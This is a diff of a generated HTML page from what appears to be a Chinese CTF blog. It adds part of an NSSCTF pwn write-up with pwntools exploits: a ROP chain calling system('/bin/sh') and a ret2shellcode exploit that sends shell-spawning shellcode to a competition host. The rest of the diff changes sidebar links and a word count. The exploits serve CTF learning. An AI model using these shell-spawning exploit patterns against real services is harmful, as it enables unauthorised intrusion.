+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x40</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里不用system=elf.sym[&lsquo;system&rsquo;]的原因是我在读汇编时恰好看到这个system地址，直接用硬编码地址更准确。</p>
+<h2 id="ret2shellcode">ret2shellcode
+</h2><p><a class="link" href="PWN-7" >PWN-7</a></p>
+<p>checksec结果依旧一样&hellip;不展示了。</p>
+<p>IDA64位分析：</p>
+<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/24.png"
+	width="760"
+	height="225"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/24_hu_9092381450c5e42c.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/24_hu_5dd9c793da5ac858.png 1024w"
+	loading="lazy"
+	
+		alt="main函数"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="337"
+		data-flex-basis="810px"
+	
+></p>
+<blockquote>
+<p>v3 = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);</p>
+<p>分配一块 4KB（0x1000 字节）的内存区域;第三个参数<code>7</code>：内存权限为 `PROT_READ，意味着可读可写可执行，<strong>往里边注入shellcode也能执行</strong>。</p></blockquote>
+<p>有read函数，读取0x1000长度到v3中，<code>mmap</code>直接分配了<code>PROT_EXEC</code>权限的内存，无需通过漏洞绕过权限限制，通过mmap函数分配内存，普通程序中注入 shellcode 常受限制（如栈不可执行<code>NX</code>、内存权限不足），但这段代码主动消除了所有障碍。</p>
+<p>exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node6.anna.nssctf.cn&#39;</span><span class="p">,</span> <span class="mi">25024</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="ret2sys">ret2sys
+</h2><p><a class="link" href="main.zip" >main.zip</a></p>
+<p>checksec：</p>
+<p><img src="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/25.png"
+	width="624"
+	height="180"
+	srcset="/p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/25_hu_77dd046e2dc90488.png 480w, /p/nssctf-%E4%B8%93%E9%A2%98pwn-writeup/25_hu_881bd2d53c7e396c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="346"
+		data-flex-basis="832px"
+	
+></p>
+<h2 id="ret2libc">ret2libc
 </h2><h2 id="综合练习">综合练习
 </h2>
 </section>
@@ -921,7 +1429,7 @@ unicode: "ece7"
 
 
         <span>
-            最后更新于 2025-10-03
+            最后更新于 2025-10-08
         </span>
     </section></footer>
 
@@ -966,15 +1474,39 @@ unicode: "ece7"
             
                 
 <article class="has-image">
-    <a href="/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/">
+    <a href="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/">
         
         
             <div class="article-image">
-                <img src="/p/awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd.ea997f807707c69a201fedb82801556a_hu_c07e85acdb17771f.png" 
+                <img src="/p/%E7%AC%AC%E4%BA%8C%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd2.521ea07b270c9bd08b40b043442201c4_hu_e37e9b7340f094d8.png" 
                         width="250" 
                         height="150" 
                         loading="lazy"
-                        alt="Featured image of post AWD水友赛"
+                        alt="Featured image of post 第二次AWD水友赛"
+                        
+                        data-hash="md5-Uh6geycMm9CLQLBDRCIBxA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">第二次AWD水友赛</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/">
+        
+        
+            <div class="article-image">
+                <img src="/p/%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B0%B4%E5%8F%8B%E8%B5%9B/awd1.ea997f807707c69a201fedb82801556a_hu_c07e85acdb17771f.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 第一次AWD水友赛"
                         
                         data-hash="md5-6pl/gHcHxpogH&#43;24KAFVag==">
                 
@@ -982,7 +1514,7 @@ unicode: "ece7"
         
 
         <div class="article-details">
-            <h2 class="article-title">AWD水友赛</h2>
+            <h2 class="article-title">第一次AWD水友赛</h2>
         </div>
     </a>
 </article>
@@ -1014,6 +1546,30 @@ unicode: "ece7"
             
                 
 <article class="has-image">
+    <a href="/p/pwn-4/">
+        
+        
+            <div class="article-image">
+                <img src="/p/pwn-4/PWN4.3657bbeb84fdb7f3290e78d3c41b8d4c_hu_d9ba59500c5360b4.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PWN-4"
+                        
+                        data-hash="md5-Nle764T9t/MpDnjTxBuNTA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PWN-4</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
     <a href="/p/pwn-3/">
         
         
@@ -1031,54 +1587,6 @@ unicode: "ece7"
 
         <div class="article-details">
             <h2 class="article-title">PWN-3</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/pwn-2/">
-        
-        
-            <div class="article-image">
-                <img src="/p/pwn-2/PWN2.ec0b8de7542727a390b799ae24c64af8_hu_ed10e985448522e2.png" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy"
-                        alt="Featured image of post PWN-2"
-                        
-                        data-hash="md5-7AuN51QnJ6OQt5muJMZK&#43;A==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">PWN-2</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/pwn-1/">
-        
-        
-            <div class="article-image">
-                <img src="/p/pwn-1/PWN.f98719505e350e475520e79f81d73a1d_hu_fb4f51a67c6d3b57.png" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy"
-                        alt="Featured image of post PWN-1"
-                        
-                        data-hash="md5-&#43;YcZUF41DkdVIOefgdc6HQ==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">PWN-1</h2>
         </div>
     </a>
 </article>
@@ -1190,11 +1698,17 @@ unicode: "ece7"
 
 
 
+
+
+
+
+
+
         
 <section class="wordcount">
   <div class="wordcount-row">
-    <p>博主发布了11篇文章  ||</p>
-    <p>总共176.25k 字</p>
+    <p>博主发布了14篇文章  ||</p>
+    <p>总共195.82k 字</p>
   </div>
 </section>
         
